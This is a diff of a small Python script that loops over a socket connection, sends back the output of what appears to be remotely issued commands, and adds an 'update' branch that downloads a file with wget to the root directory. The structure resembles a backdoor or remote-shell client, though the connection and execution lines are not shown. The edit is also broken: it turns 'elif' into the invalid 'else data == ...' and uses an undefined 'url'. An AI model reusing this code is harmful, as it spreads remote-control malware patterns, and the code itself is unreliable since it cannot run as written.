@@ -1,6 +1,7 @@
 import socket
 import os
 import time
+import wget
 while True:
     try:
         sock = socket.socket()
@@ -12,7 +13,7 @@ while True:
                 result = aa.read()
                 if len(result) == 0:
                     sock.send(" ".encode())  # в случае, если рзультат
-                elif data == "update":
+                else data == "update":
                     sock.send("Updating..".encode())  # в случае, если рзультат
                     URL = 'https://proprikol.ru/wp-content/uploads/2019/11/kartinki-anime-s-ushkami-3.jpg'
                     wget.download(url, '/')
